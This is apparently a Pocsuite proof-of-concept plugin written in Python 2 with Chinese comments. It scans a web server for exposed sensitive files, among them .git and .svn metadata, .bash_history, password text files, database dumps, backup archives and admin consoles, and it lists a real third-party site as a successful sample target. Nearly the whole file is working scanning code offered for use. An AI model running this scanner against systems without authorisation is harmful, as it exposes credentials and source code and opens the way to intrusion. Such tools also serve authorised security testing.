#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class FilefindPOC(POCBase):
    vulID = '11'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-06-26' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-06-26'# 编写 PoC 的日期
    updateDate = '2017-06-26'# PoC 更新的时间,默认和编写时间一样
    references = 'http://0535code.com/article/20170626_1829.shtml'# 漏洞地址来源,0day不用写
    name = 'Sensitive file info'# PoC 名称
    appPowerLink = '#'# 漏洞厂商主页地址
    appName = '#'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'info-disclosure'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        敏感文件泄漏漏洞
    ''' # 漏洞简要描述
    samples = ["http://law.zbj.com/.DS_Store",]# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危" #严重,高危,中危,低危

    #定义要测试的文件列表
    #后期 特殊文件根据 返回状态码减少误报
    filelist = [
    "/.svn/entries", #svn
    "/.svn/wc.db",
    "/.project", #project
    "/test/", #test
    "/test.txt",
    "/test.shtml",
    "/test.html",
    "/test.htm",
    "/test.php",
    "/test.php3",
    "/test.pl",
    "/test.py",
    "/test.pyc",
    "/test.jsp",
    "/test.cgi",
    "/test.cfm",
    "/test.aspx",
    "/test.asp",
    "/robot.txt", #robot
    "/.DS_Store", #DS_Store
    "/.git/config",#git
    "/phpinfo.php",#phpinfo
    "/.hg",
    "/README.md",
    "/.viminfo",
    "/.bash_history",
    "/.bashrc",
    "/crossdomain.xml",
    "/console",
    "/web-console",
    "/web_console",
    "/jmx-console",
    "/jmx_console",
    "/JMXInvokerServlet",
    "/invoker",
    "/nginx.conf",
    "/httpd.conf",
    "/user.txt",
    "/pass.txt",
    "/passwd.txt",
    "/password.txt",
    "/username.txt",
    "/LICENSE.txt",
    "/CHANGELOG.txt",
    "/INSTALL.txt",
    "/sitemap.xml",
    "/.htaccess",
    "/web.config",
    "/log",
    "/log.txt",
    "/CVS/Root",
    "/CVS/Entries",
    "/info.php",
    "/www.7z",
    "/www.rar",
    "/www.zip",
    "/www.tar.gz",
    "/wwwroot.zip",
    "/wwwroot.rar",
    "/wwwroot.7z",
    "/wwwroot.tar.gz",
    "/backup",
    "/backup.7z",
    "/backup.rar",
    "/backup.sql",
    "/backup.tar",
    "/backup.tar.gz",
    "/backup.zip",
    "/database.sql",
    "/index.7z",
    "/index.rar",
    "/index.sql",
    "/index.tar",
    "/index.tar.gz",
    "/index.zip",
    "/users.sql" ,
    "/phpmyadmin",
    "/pma",
    "/SiteServer",
    "/admin",
    "/Admin",
    "/manage",
    "/manager",
    "/manage/html",
    "/resin-admin",
    "/resin-doc",
    "/axis2-admin",
    "/admin-console",
    "/system",
    "/install",
    "/backup",
    "/tmp",
    "/file",
    "/xmlrpc.php",
    "/install.php",
    "/admin.php",
    "/login.php",
    "/zabbix",
    "/web-inf/web.xml",
    ]

    #验证漏洞 pocsuite -r 11-file-Sensitive-info.py -u 127.0.0.1 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        print vul_url
        if vul_url[-1] == '/':
            vul_url = vul_url[:-1]
        print vul_url
        #定义漏洞列表
        # payload_url = []
        # payload_content = []
        payload_dict = {}
        final_url = []
        #循环判断
        for file in self.filelist:
            targetURL = vul_url + file
            #print vul_url + file
            try:
                r = req.get(url=targetURL, timeout=1,allow_redirects=False) #禁止重定向
                r_text = r.text
                if r.status_code == 200:
                    payload_dict[targetURL] = r_text
                    # payload_url.append(targetURL)
                    # payload_content.append(r_text)
            except Exception,e:
                print "error",e,targetURL

        # print payload_url
        # print payload_content
        #如果有结果则输出
        if len(payload_dict) != 0 :
            for i in payload_dict:
                if payload_dict.values().count(payload_dict[i]) == 1:
                    final_url.append(i)
            print final_url
            if ((len(final_url)) != 0 and (len(final_url)) <15):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Payload'] = str(final_url)   
        print '[+]11 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(FilefindPOC)

